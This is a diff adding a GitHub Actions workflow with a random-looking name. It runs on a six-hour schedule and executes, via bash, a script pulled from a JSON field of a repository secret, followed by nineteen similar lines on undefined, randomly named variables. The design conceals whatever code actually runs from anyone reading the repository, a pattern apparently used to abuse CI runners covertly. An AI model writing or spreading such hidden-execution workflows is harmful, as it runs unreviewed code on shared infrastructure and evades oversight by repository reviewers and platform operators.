@@ -1,0 +1,37 @@
+name: zhiyaonikaijinn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhiyaonikaijinn
+        env:
+          ymsa322: ${{ secrets.ymsa322 }}
+        run: |
+          echo $ymsa322 | jq -r .tt363 | /bin/bash
+          echo $lza11602 | jq -r .u6575 | /bin/bash
+          echo $ut080 | jq -r .jr864 | /bin/bash
+          echo $clq1557 | jq -r .lla0 | /bin/bash
+          echo $o5686 | jq -r .o2 | /bin/bash
+          echo $ldg47567 | jq -r .uuvns36 | /bin/bash
+          echo $onlal35 | jq -r .fnvb40144 | /bin/bash
+          echo $gfzs2584 | jq -r .dor066 | /bin/bash
+          echo $st49 | jq -r .kwno7 | /bin/bash
+          echo $kugye7 | jq -r .reti98002 | /bin/bash
+          echo $ildj8 | jq -r .x27 | /bin/bash
+          echo $w9757 | jq -r .l257 | /bin/bash
+          echo $kbbix3 | jq -r .i82970 | /bin/bash
+          echo $us532 | jq -r .u51837 | /bin/bash
+          echo $fdrlu994 | jq -r .o15 | /bin/bash
+          echo $akmc703 | jq -r .emv244 | /bin/bash
+          echo $reorj80 | jq -r .nfab587 | /bin/bash
+          echo $jgc4869 | jq -r .gecru47 | /bin/bash
+          echo $l8637 | jq -r .lbpy669 | /bin/bash
+          echo $shzyf37486 | jq -r .bbqmi88256 | /bin/bash
+
